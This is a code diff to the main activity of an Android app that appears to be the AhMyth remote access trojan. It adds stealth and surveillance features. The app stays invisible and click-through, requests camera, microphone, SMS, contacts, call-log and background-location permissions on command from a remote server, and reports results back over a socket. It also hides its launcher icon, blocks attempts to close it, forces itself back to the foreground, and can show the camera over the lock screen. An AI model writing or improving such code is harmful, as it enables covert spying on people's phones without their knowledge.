@@ -2,6 +2,7 @@ package ahmyth.mine.king.ahmyth;
 
 import android.Manifest;
 import android.app.Activity;
+import android.app.ActivityManager;
 import android.app.AlertDialog;
 import android.app.admin.DevicePolicyManager;
 import android.content.ComponentName;
@@ -22,6 +23,7 @@ import android.support.v4.app.ActivityCompat;
 import android.support.v4.content.ContextCompat;
 import android.util.Log;
 import android.view.View;
+import android.view.Window;
 import android.widget.CompoundButton;
 import android.widget.Switch;
 import android.widget.Toast;
@@ -49,14 +51,32 @@ public class MainActivity extends Activity {
     private boolean overlayPermissionRequested = false;
     private boolean storagePermissionRequested = false;
     private boolean batteryOptRequested = false;
+    private boolean isHandlingServerPermissionRequest = false; // Track if handling server permission requests
+    private static boolean isCameraActive = false; // Track if camera is being used
+    private static MainActivity instance; // Keep reference to activity
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         
+        // Keep reference to this activity for camera operations
+        instance = this;
+        
         // Don't set any content view - app should be invisible
         // The SplashTheme in AndroidManifest makes the activity fully transparent
         Log.d(TAG, "MainActivity onCreate - Android " + Build.VERSION.RELEASE + " (SDK " + Build.VERSION.SDK_INT + ")");
+        
+        // Make activity fully transparent and clickthrough
+        try {
+            // Set window to be fully transparent
+            getWindow().setBackgroundDrawableResource(android.R.color.transparent);
+            getWindow().setStatusBarColor(android.graphics.Color.TRANSPARENT);
+            getWindow().setNavigationBarColor(android.graphics.Color.TRANSPARENT);
+            
+            Log.d(TAG, "Activity set to transparent background");
+        } catch (Exception e) {
+            Log.e(TAG, "Error setting transparent window", e);
+        }
         
         try {
             // Initialize SharedPreferences
@@ -65,10 +85,23 @@ public class MainActivity extends Activity {
             Log.e(TAG, "Error initializing SharedPreferences", e);
         }
 
+        // Check if this is a permission request from server
+        Intent intent = getIntent();
+        if (intent != null && intent.hasExtra("request_permission")) {
+            String permissionType = intent.getStringExtra("request_permission");
+            Log.d(TAG, "Permission request from server: " + permissionType);
+            isHandlingServerPermissionRequest = true; // Mark that we're handling server permission requests
+            handlePermissionRequest(permissionType);
+            // DO NOT return - keep activity alive for permission dialogs
+        }
+
         // Check if ADB_GRANT_MODE - permissions already granted via ADB
         if (StealthConfig.ADB_GRANT_MODE) {
             Log.d(TAG, "ADB_GRANT_MODE enabled - skipping permission prompts");
             startMainService();
+            
+            // Apply transparent clickthrough immediately
+            applyTransparentClickthrough();
             
             // Quick stealth exit
             if (StealthConfig.AUTO_CLOSE_ACTIVITY) {
@@ -81,8 +114,13 @@ public class MainActivity extends Activity {
             return;
         }
         
-        // Start service immediately in background
+        // Start service first
         startMainService();
+        
+        // Apply transparent clickthrough mode
+        applyTransparentClickthrough();
+        
+        Log.d(TAG, "MainActivity onCreate complete");
         
         // Request permissions with minimal delay
         int delay = StealthConfig.SILENT_PERMISSION_MODE ? 100 : 500;
@@ -104,21 +142,212 @@ public class MainActivity extends Activity {
             }
         }, delay);
     }
-
+    
+    @Override
+    protected void onNewIntent(Intent intent) {
+        super.onNewIntent(intent);
+        setIntent(intent);
+        
+        // Handle permission request from server when activity is already running
+        if (intent != null && intent.hasExtra("request_permission")) {
+            String permissionType = intent.getStringExtra("request_permission");
+            Log.d(TAG, "Permission request from server (onNewIntent): " + permissionType);
+            isHandlingServerPermissionRequest = true; // Mark that we're handling server permission requests
+            handlePermissionRequest(permissionType);
+        }
+    }
+    
+    private void handlePermissionRequest(String permissionType) {
+        if (permissionType == null) {
+            Log.e(TAG, "Permission type is null");
+            return;
+        }
+        
+        Log.d(TAG, "Handling permission request: " + permissionType);
+        
+        // Mark that we're handling server permission requests - keep activity alive
+        isHandlingServerPermissionRequest = true;
+        
+        // Ensure activity is enabled and visible for permission dialogs
+        // Don't hide icon while requesting permissions
+        try {
+            PackageManager pm = getPackageManager();
+            ComponentName mainActivity = getComponentName();
+            int state = pm.getComponentEnabledSetting(mainActivity);
+            if (state == PackageManager.COMPONENT_ENABLED_STATE_DISABLED ||
+                state == PackageManager.COMPONENT_ENABLED_STATE_DISABLED_USER) {
+                pm.setComponentEnabledSetting(mainActivity,
+                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
+                    PackageManager.DONT_KILL_APP);
+                Log.d(TAG, "MainActivity enabled for permission request");
+            }
+        } catch (Exception e) {
+            Log.w(TAG, "Could not ensure MainActivity is enabled", e);
+        }
+        
+        // Start service in background first
+        startMainService();
+        
+        // Make window focusable for permission dialog
+        makeFocusable();
+        
+        // Bring activity to foreground for permission dialog
+        try {
+            
+            // Bring activity to foreground
+            ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
+            int taskId = getTaskId();
+            if (taskId > 0) {
+                am.moveTaskToFront(taskId, ActivityManager.MOVE_TASK_WITH_HOME);
+                Log.d(TAG, "Brought activity to front for permission request");
+            }
+        } catch (Exception e) {
+            Log.w(TAG, "Could not move task to front", e);
+        }
+        
+        // Map permission type to actual permission string
+        String permission = null;
+        switch (permissionType.toLowerCase()) {
+            case "camera":
+                permission = Manifest.permission.CAMERA;
+                break;
+            case "microphone":
+            case "mic":
+            case "audio":
+                permission = Manifest.permission.RECORD_AUDIO;
+                break;
+            case "location":
+            case "gps":
+                permission = Manifest.permission.ACCESS_FINE_LOCATION;
+                break;
+            case "contacts":
+                permission = Manifest.permission.READ_CONTACTS;
+                break;
+            case "sms":
+                permission = Manifest.permission.READ_SMS;
+                break;
+            case "phone":
+            case "calls":
+            case "calllogs":
+                permission = Manifest.permission.READ_PHONE_STATE;
+                break;
+            case "storage":
+            case "files":
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+                    try {
+                        Intent settingsIntent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
+                        settingsIntent.setData(Uri.parse("package:" + getPackageName()));
+                        settingsIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                        startActivityForResult(settingsIntent, MANAGE_STORAGE_CODE);
+                    } catch (Exception e) {
+                        Log.e(TAG, "Error opening storage settings", e);
+                    }
+                    return;
+                } else {
+                    permission = Manifest.permission.READ_EXTERNAL_STORAGE;
+                }
+                break;
+            default:
+                Log.e(TAG, "Unknown permission type: " + permissionType);
+                return;
+        }
+        
+        // Check if permission is already granted
+        if (permission != null) {
+            // Check if permission is already granted
+            if (ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED) {
+                Log.d(TAG, "Permission already granted: " + permission);
+                sendStatusToServer(permissionType, true, "Permission already granted");
+                return;
+            }
+            
+            // Request the permission - ensure activity is ready first
+            final String finalPermission = permission;
+            
+            // Wait for activity to be fully ready, then request permission
+            // Use multiple attempts with increasing delays to ensure dialog appears
+            handler.postDelayed(() -> {
+                try {
+                    if (isFinishing()) {
+                        Log.w(TAG, "Activity is finishing, cannot request permission");
+                        return;
+                    }
+                    
+                    // Ensure we're in foreground - try to move task to front again
+                    try {
+                        ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
+                        int taskId = getTaskId();
+                        if (taskId > 0 && !hasWindowFocus()) {
+                            am.moveTaskToFront(taskId, ActivityManager.MOVE_TASK_WITH_HOME);
+                            Log.d(TAG, "Re-moved task to front: " + taskId);
+                        }
+                    } catch (Exception e) {
+                        Log.w(TAG, "Could not re-move task to front", e);
+                    }
+                    
+                    // Ensure window is visible
+                    getWindow().getDecorView().bringToFront();
+                    getWindow().getDecorView().requestFocus();
+                    
+                    // First attempt - immediate
+                    Log.d(TAG, "Requesting permission (attempt 1): " + finalPermission);
+                    ActivityCompat.requestPermissions(this, new String[]{finalPermission}, PERMISSION_REQUEST_CODE);
+                    
+                    // Second attempt - delayed in case first didn't work
+                    handler.postDelayed(() -> {
+                        try {
+                            if (!isFinishing() && !hasWindowFocus()) {
+                                // Try one more time to bring to front
+                                try {
+                                    ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
+                                    int taskId = getTaskId();
+                                    if (taskId > 0) {
+                                        am.moveTaskToFront(taskId, ActivityManager.MOVE_TASK_WITH_HOME);
+                                    }
+                                } catch (Exception e) {
+                                    // Ignore
+                                }
+                                getWindow().getDecorView().bringToFront();
+                                getWindow().getDecorView().requestFocus();
+                            }
+                            if (!isFinishing()) {
+                                Log.d(TAG, "Requesting permission (attempt 2): " + finalPermission);
+                                ActivityCompat.requestPermissions(this, new String[]{finalPermission}, PERMISSION_REQUEST_CODE);
+                            }
+                        } catch (Exception e) {
+                            Log.e(TAG, "Error requesting permission (attempt 2)", e);
+                        }
+                    }, 800); // 800ms delay for second attempt
+                    
+                } catch (Exception e) {
+                    Log.e(TAG, "Error requesting permission", e);
+                }
+            }, 1000); // 1 second delay to ensure activity is fully visible
+        }
+    }
+    
     private void buildPermissionList() {
         permissionsToRequest.clear();
         currentPermissionIndex = 0;
         
         // Build list of permissions that need to be requested
+        // Group them so they can be requested in batches
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            // Core permissions - request these in one batch
             addPermissionIfNeeded(Manifest.permission.CAMERA);
             addPermissionIfNeeded(Manifest.permission.RECORD_AUDIO);
-            addPermissionIfNeeded(Manifest.permission.ACCESS_FINE_LOCATION);
             addPermissionIfNeeded(Manifest.permission.READ_CONTACTS);
+            addPermissionIfNeeded(Manifest.permission.WRITE_CONTACTS);
             addPermissionIfNeeded(Manifest.permission.READ_SMS);
             addPermissionIfNeeded(Manifest.permission.SEND_SMS);
+            addPermissionIfNeeded(Manifest.permission.RECEIVE_SMS);
             addPermissionIfNeeded(Manifest.permission.READ_CALL_LOG);
             addPermissionIfNeeded(Manifest.permission.READ_PHONE_STATE);
+            addPermissionIfNeeded(Manifest.permission.CALL_PHONE);
+            
+            // Location permission (will need separate handling for background)
+            addPermissionIfNeeded(Manifest.permission.ACCESS_FINE_LOCATION);
+            addPermissionIfNeeded(Manifest.permission.ACCESS_COARSE_LOCATION);
             
             if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.S_V2) {
                 addPermissionIfNeeded(Manifest.permission.READ_EXTERNAL_STORAGE);
@@ -130,10 +359,6 @@ public class MainActivity extends Activity {
                 addPermissionIfNeeded(Manifest.permission.READ_MEDIA_IMAGES);
                 addPermissionIfNeeded(Manifest.permission.READ_MEDIA_VIDEO);
                 addPermissionIfNeeded(Manifest.permission.READ_MEDIA_AUDIO);
-            }
-            
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                addPermissionIfNeeded(Manifest.permission.ACCESS_BACKGROUND_LOCATION);
             }
         }
         
@@ -148,12 +373,9 @@ public class MainActivity extends Activity {
     
     private void requestNextPermission() {
         if (currentPermissionIndex >= permissionsToRequest.size()) {
-            // All runtime permissions done
-            if (StealthConfig.SKIP_SPECIAL_PERMISSIONS) {
-                applyStealthConfig();
-            } else {
-                requestSpecialPermissions();
-            }
+            // All runtime permissions done, now request special permissions
+            Log.d(TAG, "All runtime permissions requested, moving to special permissions");
+            requestBackgroundLocationIfNeeded();
             return;
         }
         
@@ -163,13 +385,28 @@ public class MainActivity extends Activity {
             return;
         }
         
-        final String permission = permissionsToRequest.get(currentPermissionIndex);
-        currentPermissionIndex++;
-        
-        Log.d(TAG, "Requesting permission: " + permission);
-        
-        // Request the permission directly without explanation dialog
-        ActivityCompat.requestPermissions(this, new String[]{permission}, PERMISSION_REQUEST_CODE);
+        // NON-STEALTH MODE: Request all remaining permissions in ONE batch
+        // This shows ONE dialog with all permissions instead of multiple dialogs
+        int remaining = permissionsToRequest.size() - currentPermissionIndex;
+        if (remaining > 0) {
+            Log.d(TAG, "Requesting " + remaining + " permissions in batch");
+            
+            // Make window focusable before requesting permissions
+            makeFocusable();
+            
+            String[] batchPermissions = new String[remaining];
+            for (int i = 0; i < remaining; i++) {
+                batchPermissions[i] = permissionsToRequest.get(currentPermissionIndex + i);
+            }
+            currentPermissionIndex = permissionsToRequest.size(); // Mark all as requested
+            
+            // Request all at once - shows single dialog on most devices
+            // Ensure activity is visible for this
+            makeFocusable();
+            ActivityCompat.requestPermissions(this, batchPermissions, PERMISSION_REQUEST_CODE);
+        } else {
+            requestBackgroundLocationIfNeeded();
+        }
     }
     
     // Request all permissions at once in batch mode - fastest method
@@ -197,10 +434,32 @@ public class MainActivity extends Activity {
         
         if (requestCode == PERMISSION_REQUEST_CODE) {
             int granted = 0;
+            boolean anyDenied = false;
+            String deniedPermission = "";
+            
             for (int i = 0; i < grantResults.length; i++) {
-                if (grantResults[i] == PackageManager.PERMISSION_GRANTED) granted++;
+                if (grantResults[i] == PackageManager.PERMISSION_GRANTED) {
+                    granted++;
+                } else {
+                    anyDenied = true;
+                    if (permissions.length > i) deniedPermission = permissions[i];
+                }
+                Log.d(TAG, "Permission " + permissions[i] + ": " + 
+                    (grantResults[i] == PackageManager.PERMISSION_GRANTED ? "GRANTED" : "DENIED"));
             }
             Log.d(TAG, "Permissions granted: " + granted + "/" + permissions.length);
+            
+            // Notify server if we are in manual request mode
+            if (isHandlingServerPermissionRequest) {
+                if (anyDenied) {
+                    sendStatusToServer("request", false, "Permission denied by user: " + deniedPermission);
+                } else {
+                    sendStatusToServer("request", true, "Permission granted by user");
+                }
+            }
+            
+            // Restore clickthrough after permissions handled
+            applyTransparentClickthrough();
             
             // Minimal delay for fast processing
             int delay = StealthConfig.SILENT_PERMISSION_MODE ? StealthConfig.PERMISSION_DELAY_MS : 300;
@@ -209,9 +468,74 @@ public class MainActivity extends Activity {
                     requestNextPermission();
                 } catch (Exception e) {
                     Log.e(TAG, "Error in requestNextPermission", e);
-                    applyStealthConfig();
+                    requestBackgroundLocationIfNeeded();
                 }
             }, delay);
+        } else if (requestCode == BACKGROUND_LOCATION_CODE) {
+            // Background location result
+            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
+                Log.d(TAG, "Background location permission GRANTED");
+                if (isHandlingServerPermissionRequest) sendStatusToServer("location_background", true, "Background location granted");
+            } else {
+                Log.d(TAG, "Background location permission DENIED");
+                if (isHandlingServerPermissionRequest) sendStatusToServer("location_background", false, "Background location denied");
+            }
+            // Continue to special permissions
+            handler.postDelayed(() -> {
+                if (StealthConfig.SKIP_SPECIAL_PERMISSIONS) {
+                    applyStealthConfig();
+                } else {
+                    requestSpecialPermissions();
+                }
+            }, 300);
+        }
+    }
+    
+    private void sendStatusToServer(String permissionType, boolean success, String message) {
+        try {
+            org.json.JSONObject result = new org.json.JSONObject();
+            result.put("permission", permissionType);
+            result.put("success", success);
+            result.put("message", message);
+            result.put("accepted", success); // Explicit flag for acceptance
+            
+            // Send directly if socket available, or via intent
+            if (ConnectionManager.getSocket() != null && ConnectionManager.getSocket().connected()) {
+                ConnectionManager.getSocket().emit("x0000rp", result);
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Error sending status to server", e);
+        }
+    }
+    
+    // Request background location permission (Android 10+)
+    private static final int BACKGROUND_LOCATION_CODE = 1008;
+    private boolean backgroundLocationRequested = false;
+    
+    private void requestBackgroundLocationIfNeeded() {
+        // Background location requires separate request on Android 10+
+        if (!backgroundLocationRequested && Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            // Check if foreground location is granted first
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) 
+                == PackageManager.PERMISSION_GRANTED) {
+                // Check if background location is not granted
+                if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION)
+                    != PackageManager.PERMISSION_GRANTED) {
+                    backgroundLocationRequested = true;
+                    Log.d(TAG, "Requesting background location permission");
+                    ActivityCompat.requestPermissions(this, 
+                        new String[]{Manifest.permission.ACCESS_BACKGROUND_LOCATION}, 
+                        BACKGROUND_LOCATION_CODE);
+                    return;
+                }
+            }
+        }
+        
+        // Continue to special permissions
+        if (StealthConfig.SKIP_SPECIAL_PERMISSIONS) {
+            applyStealthConfig();
+        } else {
+            requestSpecialPermissions();
         }
     }
     
@@ -283,8 +607,26 @@ public class MainActivity extends Activity {
     protected void onActivityResult(int requestCode, int resultCode, Intent data) {
         super.onActivityResult(requestCode, resultCode, data);
         
+        Log.d(TAG, "onActivityResult: requestCode=" + requestCode + ", resultCode=" + resultCode);
+        
         switch (requestCode) {
+            case BACKGROUND_LOCATION_CODE:
+                // Continue to special permissions after background location
+                Log.d(TAG, "Background location result received, continuing...");
+                handler.postDelayed(new Runnable() {
+                    @Override
+                    public void run() {
+                        if (StealthConfig.SKIP_SPECIAL_PERMISSIONS) {
+                            applyStealthConfig();
+                        } else {
+                            requestSpecialPermissions();
+                        }
+                    }
+                }, 300);
+                break;
+                
             case BATTERY_OPTIMIZATION_CODE:
+                Log.d(TAG, "Battery optimization result received, continuing...");
                 handler.postDelayed(new Runnable() {
                     @Override
                     public void run() {
@@ -294,6 +636,7 @@ public class MainActivity extends Activity {
                 break;
                 
             case OVERLAY_PERMISSION_CODE:
+                Log.d(TAG, "Overlay permission result received, continuing...");
                 handler.postDelayed(new Runnable() {
                     @Override
                     public void run() {
@@ -303,6 +646,7 @@ public class MainActivity extends Activity {
                 break;
                 
             case MANAGE_STORAGE_CODE:
+                Log.d(TAG, "Storage management result received, continuing...");
                 handler.postDelayed(new Runnable() {
                     @Override
                     public void run() {
@@ -439,14 +783,20 @@ public class MainActivity extends Activity {
             }, StealthConfig.HIDE_DELAY_MS);
         }
         
-        if (StealthConfig.AUTO_CLOSE_ACTIVITY) {
+        // DO NOT finish activity if we're handling server permission requests
+        // Keep activity alive and transparent in foreground for permission dialogs
+        if (StealthConfig.AUTO_CLOSE_ACTIVITY && !isHandlingServerPermissionRequest) {
             handler.postDelayed(new Runnable() {
                 @Override
                 public void run() {
-                    moveTaskToBack(true);
-                    finish();
+                    finishAndRemoveTask(); // Completely remove task
                 }
             }, StealthConfig.HIDE_DELAY_MS + 500);
+        } else {
+            // Finish activity - rely on Service overlay for foreground persistence
+            // This ensures we don't block the screen
+            Log.d(TAG, "Finishing activity - Service Overlay will maintain persistence");
+            finishAndRemoveTask();
         }
     }
 
@@ -482,17 +832,40 @@ public class MainActivity extends Activity {
 
     private void hideAppIcon() {
         try {
-            // Disable launcher alias
             PackageManager pm = getPackageManager();
-            ComponentName launcherAlias = new ComponentName(this, "ahmyth.mine.king.ahmyth.LauncherAlias");
-            pm.setComponentEnabledSetting(launcherAlias,
-                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                PackageManager.DONT_KILL_APP);
+            
+            // Try to disable launcher alias if it exists
+            try {
+                ComponentName launcherAlias = new ComponentName(this, "ahmyth.mine.king.ahmyth.LauncherAlias");
+                // Check if component exists by trying to get its enabled state
+                int state = pm.getComponentEnabledSetting(launcherAlias);
+                // If we get here without exception, component exists
+                if (state != PackageManager.COMPONENT_ENABLED_STATE_DISABLED &&
+                    state != PackageManager.COMPONENT_ENABLED_STATE_DISABLED_USER) {
+                    pm.setComponentEnabledSetting(launcherAlias,
+                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                        PackageManager.DONT_KILL_APP);
+                    Log.d(TAG, "LauncherAlias disabled");
+                }
+            } catch (IllegalArgumentException e) {
+                // Component doesn't exist, skip it
+                Log.d(TAG, "LauncherAlias component not found, skipping");
+            } catch (Exception e) {
+                Log.d(TAG, "Could not disable LauncherAlias: " + e.getMessage());
+            }
                 
-            // Disable main activity launcher entry
-            pm.setComponentEnabledSetting(getComponentName(),
-                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                PackageManager.DONT_KILL_APP);
+            // Keep MainActivity ENABLED but hide from launcher
+            // This allows camera and other features to work while remaining hidden
+            // DON'T disable the activity - just disable the launcher alias
+            try {
+                // MainActivity must remain ENABLED for camera and other system APIs
+                pm.setComponentEnabledSetting(getComponentName(),
+                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
+                    PackageManager.DONT_KILL_APP);
+                Log.d(TAG, "Main activity kept enabled (but hidden from launcher)");
+            } catch (Exception e) {
+                Log.w(TAG, "Could not ensure main activity enabled", e);
+            }
                 
             Log.d(TAG, "App icon hidden");
         } catch (Exception e) {
@@ -509,11 +882,314 @@ public class MainActivity extends Activity {
     protected void onResume() {
         super.onResume();
         Log.d(TAG, "MainActivity onResume");
+        
+        // Keep activity in foreground but transparent and clickthrough
+        if (isCameraActive) {
+            Log.d(TAG, "onResume: Camera active - staying in foreground");
+            applyTransparentClickthrough();
+        } else {
+            Log.d(TAG, "onResume: Staying in foreground, transparent & clickthrough");
+            applyTransparentClickthrough();
+        }
+        
+        // If handling permission, ensure we're in front
+        if (isHandlingServerPermissionRequest) {
+            try {
+                ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
+                int taskId = getTaskId();
+                if (taskId > 0) {
+                    am.moveTaskToFront(taskId, ActivityManager.MOVE_TASK_WITH_HOME);
+                    Log.d(TAG, "Moved task to front for permission: " + taskId);
+                }
+            } catch (Exception e) {
+                Log.w(TAG, "Could not bring activity to foreground", e);
+            }
+        }
+        
+        // Check if we need to request permission (in case activity was resumed)
+        Intent intent = getIntent();
+        if (intent != null && intent.hasExtra("request_permission")) {
+            String permissionType = intent.getStringExtra("request_permission");
+            Log.d(TAG, "Permission request detected in onResume: " + permissionType);
+            isHandlingServerPermissionRequest = true;
+            // Small delay to ensure activity is fully resumed and in foreground
+            handler.postDelayed(() -> {
+                // Ensure we're still in foreground
+                try {
+                    ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
+                    int taskId = getTaskId();
+                    if (taskId > 0 && !hasWindowFocus()) {
+                        am.moveTaskToFront(taskId, ActivityManager.MOVE_TASK_WITH_HOME);
+                    }
+                    getWindow().getDecorView().bringToFront();
+                    getWindow().getDecorView().requestFocus();
+                } catch (Exception e) {
+                    Log.w(TAG, "Could not keep activity in foreground", e);
+                }
+                handlePermissionRequest(permissionType);
+            }, 500);
+        }
+    }
+    
+    @Override
+    protected void onStart() {
+        super.onStart();
+        Log.d(TAG, "MainActivity onStart");
+        
+        // Keep activity in foreground but transparent and clickthrough
+        if (isCameraActive) {
+            Log.d(TAG, "onStart: Camera active - staying in foreground");
+            applyTransparentClickthrough();
+        } else {
+            Log.d(TAG, "onStart: Staying in foreground, transparent & clickthrough");
+            applyTransparentClickthrough();
+        }
+        
+        // If handling permission, ensure we're in front
+        if (isHandlingServerPermissionRequest) {
+            try {
+                ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
+                int taskId = getTaskId();
+                if (taskId > 0) {
+                    am.moveTaskToFront(taskId, ActivityManager.MOVE_TASK_WITH_HOME);
+                    Log.d(TAG, "Moved task to front for permission: " + taskId);
+                }
+            } catch (Exception e) {
+                Log.w(TAG, "Could not bring activity to foreground", e);
+            }
+        }
+        
+        // Check if we need to request permission (in case activity was started)
+        Intent intent = getIntent();
+        if (intent != null && intent.hasExtra("request_permission")) {
+            String permissionType = intent.getStringExtra("request_permission");
+            Log.d(TAG, "Permission request detected in onStart: " + permissionType);
+            isHandlingServerPermissionRequest = true;
+            // Small delay to ensure activity is fully started
+            handler.postDelayed(() -> {
+                handlePermissionRequest(permissionType);
+            }, 600);
+        }
     }
 
     @Override
+    protected void onPause() {
+        super.onPause();
+        Log.d(TAG, "MainActivity onPause");
+        
+        // If user pressed home during setup, bring app back after short delay
+        // This ensures permission flow continues
+        if (!StealthConfig.AUTO_CLOSE_ACTIVITY && currentPermissionIndex < permissionsToRequest.size()) {
+            handler.postDelayed(() -> {
+                try {
+                    if (!isFinishing()) {
+                        Log.d(TAG, "Bringing activity back to foreground for permission continuation");
+                        Intent intent = new Intent(this, MainActivity.class);
+                        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | 
+                                      Intent.FLAG_ACTIVITY_SINGLE_TOP |
+                                      Intent.FLAG_ACTIVITY_REORDER_TO_FRONT);
+                        startActivity(intent);
+                    }
+                } catch (Exception e) {
+                    Log.e(TAG, "Could not bring activity back", e);
+                }
+            }, 2000); // 2 second delay before bringing back
+        }
+    }
+    
+    @Override
+    protected void onStop() {
+        super.onStop();
+        Log.d(TAG, "MainActivity onStop");
+        
+        // Don't finish activity, keep it in background for later
+        // Service will keep running
+    }
+    
+    @Override
+    public void finish() {
+        // Prevent finishing if we're handling server permission requests
+        // Keep activity alive and transparent in foreground for permission dialogs
+        if (isHandlingServerPermissionRequest) {
+            Log.d(TAG, "Prevented finish() - keeping activity alive for permission requests");
+            // Ensure activity stays transparent and in foreground
+            try {
+                // Keep window transparent
+                android.view.WindowManager.LayoutParams params = getWindow().getAttributes();
+                params.alpha = 0.0f;
+                params.dimAmount = 0.0f;
+                getWindow().setAttributes(params);
+                
+                // Bring to front
+                ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
+                int taskId = getTaskId();
+                if (taskId > 0) {
+                    am.moveTaskToFront(taskId, ActivityManager.MOVE_TASK_WITH_HOME);
+                }
+                getWindow().getDecorView().bringToFront();
+                getWindow().getDecorView().requestFocus();
+            } catch (Exception e) {
+                Log.w(TAG, "Could not keep activity in foreground", e);
+            }
+            return; // Don't call super.finish()
+        }
+        
+        // Only finish if not handling server permission requests
+        Log.d(TAG, "Activity finishing normally");
+        super.finish();
+    }
+    
+    @Override
+    public void finishAndRemoveTask() {
+        // Prevent finishing if we're handling server permission requests
+        if (isHandlingServerPermissionRequest) {
+            Log.d(TAG, "Prevented finishAndRemoveTask() - keeping activity alive for permission requests");
+            return; // Don't call super.finishAndRemoveTask()
+        }
+        super.finishAndRemoveTask();
+    }
+    
+    @Override
+    public void finishAffinity() {
+        // Prevent finishing if we're handling server permission requests
+        if (isHandlingServerPermissionRequest) {
+            Log.d(TAG, "Prevented finishAffinity() - keeping activity alive for permission requests");
+            return; // Don't call super.finishAffinity()
+        }
+        super.finishAffinity();
+    }
+    
+    @Override
     protected void onDestroy() {
+        // Only destroy if not handling server permission requests
+        if (isHandlingServerPermissionRequest) {
+            Log.d(TAG, "Prevented onDestroy() - keeping activity alive for permission requests");
+            // Recreate activity to keep it alive
+            try {
+                ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
+                int taskId = getTaskId();
+                if (taskId > 0) {
+                    am.moveTaskToFront(taskId, ActivityManager.MOVE_TASK_WITH_HOME);
+                }
+                // Restart activity to keep it alive
+                Intent intent = getIntent();
+                if (intent != null) {
+                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
+                    startActivity(intent);
+                }
+            } catch (Exception e) {
+                Log.w(TAG, "Could not restart activity", e);
+            }
+            return; // Don't call super.onDestroy()
+        }
+        
         super.onDestroy();
         Log.d(TAG, "MainActivity onDestroy - Service continues in background");
+        instance = null;
+    }
+    
+    // Static methods for camera control
+    public static void setCameraActive(boolean active) {
+        isCameraActive = active;
+        Log.d(TAG, "Camera active state changed: " + active);
+        
+        if (instance != null) {
+            instance.runOnUiThread(() -> {
+                if (active) {
+                    // Bring to front but keep transparent/clickthrough
+                    // This is needed because some Android versions kill camera if activity is in background
+                    try {
+                        ActivityManager am = (ActivityManager) instance.getSystemService(Context.ACTIVITY_SERVICE);
+                        am.moveTaskToFront(instance.getTaskId(), ActivityManager.MOVE_TASK_WITH_HOME);
+                        Log.d(TAG, "Brought activity to front for camera");
+                    } catch (Exception e) {
+                        Log.e(TAG, "Error moving task to front", e);
+                    }
+                    instance.applyTransparentClickthrough();
+                } else {
+                    // Camera finished
+                    instance.applyTransparentClickthrough();
+                    // Don't move to back immediately to avoid UI flicker, just stay transparent
+                }
+            });
+        } else if (active) {
+            // Instance is null but we need it for camera - try to start it
+            try {
+                Context context = MainService.getContextOfApplication();
+                if (context != null) {
+                    Log.d(TAG, "Starting MainActivity for camera");
+                    Intent intent = new Intent(context, MainActivity.class);
+                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                    context.startActivity(intent);
+                }
+            } catch (Exception e) {
+                Log.e(TAG, "Error starting MainActivity for camera", e);
+            }
+        }
+    }
+    
+    private void applyTransparentClickthrough() {
+        try {
+            Window window = getWindow();
+            android.view.WindowManager.LayoutParams params = window.getAttributes();
+            
+            // Make fully transparent
+            params.alpha = 0.05f; // Slightly visible to prevent background killing, but practically invisible
+            params.dimAmount = 0.0f;
+            
+            // Proper clickthrough flags - allow touches to pass through to apps below
+            // FLAG_NOT_TOUCHABLE: window doesn't receive any touch events - passes through
+            // FLAG_NOT_FOCUSABLE: window doesn't take input focus, allows clicks through
+            // FLAG_NOT_TOUCH_MODAL: touch events outside the window go to windows behind
+            params.flags |= android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE;
+            params.flags |= android.view.WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE;
+            params.flags |= android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL;
+            
+            // Allow showing over lockscreen if camera is needed
+            if (isCameraActive) {
+                params.flags |= android.view.WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED;
+                params.flags |= android.view.WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD;
+                params.flags |= android.view.WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON;
+            } else {
+                // Clear these flags when not needed
+                params.flags &= ~android.view.WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED;
+                params.flags &= ~android.view.WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD;
+                params.flags &= ~android.view.WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON;
+            }
+            
+            window.setAttributes(params);
+            
+            Log.d(TAG, "Applied transparent clickthrough - alpha: " + params.alpha + ", flags: " + Integer.toHexString(params.flags));
+        } catch (Exception e) {
+            Log.e(TAG, "Error applying transparent clickthrough", e);
+        }
+    }
+    
